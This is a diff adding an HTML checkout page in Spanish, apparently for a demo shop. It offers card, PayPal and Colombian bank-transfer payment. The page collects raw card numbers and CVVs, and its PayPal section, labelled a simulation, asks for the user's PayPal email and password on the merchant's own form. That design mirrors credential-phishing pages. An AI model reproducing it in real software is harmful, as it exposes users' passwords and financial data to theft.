@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Checkout</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body class="bg-light">
+    <div class="container mt-5" style="max-width: 500px;">
+        <div class="card p-4 shadow-sm">
+            <h3 class="text-center mb-4">Resumen de Pago</h3>
+            <p class="fs-5">{{ product.name }} <span class="float-end fw-bold">${{ product.price }}</span></p>
+            <hr>
+            
+            <form action="/process_payment" method="POST">
+                <input type="hidden" name="amount" value="{{ product.price }}">
+                
+                <div class="mb-3">
+                    <label class="form-label">Selecciona el método de pago:</label>
+                    <select name="payment_method" id="methodSelect" class="form-select" onchange="toggleFields()">
+                        <option value="credit_card">💳 Tarjeta de Crédito</option>
+                        <option value="paypal">🅿️ PayPal</option>
+                        <option value="bank_transfer">🏦 Transferencia Bancaria</option>
+                    </select>
+                </div>
+
+                <div id="cardFields">
+                    <div class="mb-3">
+                        <label class="form-label">Número de Tarjeta</label>
+                        <input type="tel" name="card_number" id="card_number" class="form-control" placeholder="1234 5678 9101 1121" maxlength="19" required>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">Fecha de Exp. (MM/AA)</label>
+                            <input type="text" name="expiry_date" id="expiry_date" class="form-control" placeholder="12/25" maxlength="5" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">CVV</label>
+                            <input type="password" name="cvv" id="cvv" class="form-control" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="paypalFields" style="display: none;">
+                    <div class="alert alert-info py-2" role="alert">
+                        <small>Simulación de inicio de sesión de PayPal</small>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Correo de PayPal</label>
+                        <input type="email" name="paypal_email" id="paypal_email" class="form-control" placeholder="usuario@correo.com">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Contraseña</label>
+                        <input type="password" name="paypal_password" id="paypal_password" class="form-control" placeholder="******">
+                    </div>
+                </div>
+
+                <div id="bankFields" style="display: none;">
+                    <div class="mb-3">
+                        <label class="form-label">Titular de la Cuenta</label>
+                        <input type="text" name="account_holder" id="account_holder" class="form-control" placeholder="Nombre completo">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Nombre del Banco</label>
+                        <select name="bank_name" id="bank_name" class="form-select">
+                            <option value="">Selecciona tu banco...</option>
+                            <option value="Bancolombia">Bancolombia</option>
+                            <option value="Nequi">Nequi</option>
+                            <option value="Davivienda">Davivienda</option>
+                            <option value="Daviplata">Daviplata</option>
+                            <option value="Banco de Bogotá">Banco de Bogotá</option>
+                            <option value="BBVA Colombia">BBVA Colombia</option>
+                            <option value="Banco de Occidente">Banco de Occidente</option>
+                            <option value="Banco Popular">Banco Popular</option>
+                            <option value="Banco AV Villas">Banco AV Villas</option>
+                            <option value="Banco Caja Social">Banco Caja Social</option>
+                            <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+                            <option value="Banco Agrario">Banco Agrario</option>
+                            <option value="Bancamía">Bancamía</option>
+                            <option value="Lulo Bank">Lulo Bank</option>
+                        </select>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label" id="label_account_number">Número de Cuenta</label>
+                            <input type="text" name="account_number" id="account_number" class="form-control" placeholder="1234567890">
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">Código SWIFT/BIC</label>
+                            <input type="text" name="swift_code" id="swift_code" class="form-control" placeholder="ABCDEF12XXX">
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn btn-success w-100 mt-3">Procesar Pago</button>
+                <a href="/" class="btn btn-outline-secondary w-100 mt-2">Cancelar</a>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function toggleFields() {
+            const method = document.getElementById("methodSelect").value;
+            
+            // Ocultar todos los contenedores
+            document.getElementById("cardFields").style.display = "none";
+            document.getElementById("paypalFields").style.display = "none";
+            document.getElementById("bankFields").style.display = "none";
+            
+            
+            document.querySelectorAll('#cardFields input, #paypalFields input, #bankFields input, #bankFields select').forEach(element => {
+                element.required = false;
+            });
+            
+           
+            if (method === "credit_card") {
+                document.getElementById("cardFields").style.display = "block";
+                document.getElementById("card_number").required = true;
+                document.getElementById("expiry_date").required = true;
+                document.getElementById("cvv").required = true;
+            } else if (method === "paypal") {
+                document.getElementById("paypalFields").style.display = "block";
+                document.getElementById("paypal_email").required = true;
+                document.getElementById("paypal_password").required = true;
+            } else if (method === "bank_transfer") {
+                document.getElementById("bankFields").style.display = "block";
+                document.getElementById("account_holder").required = true;
+                document.getElementById("bank_name").required = true;
+                document.getElementById("account_number").required = true;
+                document.getElementById("swift_code").required = true;
+            }
+        }
+
+        
+        document.getElementById('card_number').addEventListener('input', function (e) {
+            let target = e.target;
+            let value = target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            target.value = formattedValue;
+        });
+        
+        
+        document.getElementById('expiry_date').addEventListener('input', function (e) {
+            let target = e.target;
+            let value = target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
+            if (value.length > 2) {
+                target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                target.value = value;
+            }
+        });
+
+        
+        document.getElementById('bank_name').addEventListener('change', function (e) {
+            const selectedBank = e.target.value;
+            const labelAccount = document.getElementById('label_account_number');
+            const inputAccount = document.getElementById('account_number');
+
+            if (selectedBank === 'Nequi' || selectedBank === 'Daviplata') {
+                labelAccount.innerText = 'Número de Celular';
+                inputAccount.placeholder = '3001234567';
+            } else {
+                labelAccount.innerText = 'Número de Cuenta';
+                inputAccount.placeholder = '1234567890';
+            }
+        });
+    </script>
+</body>
+</html>
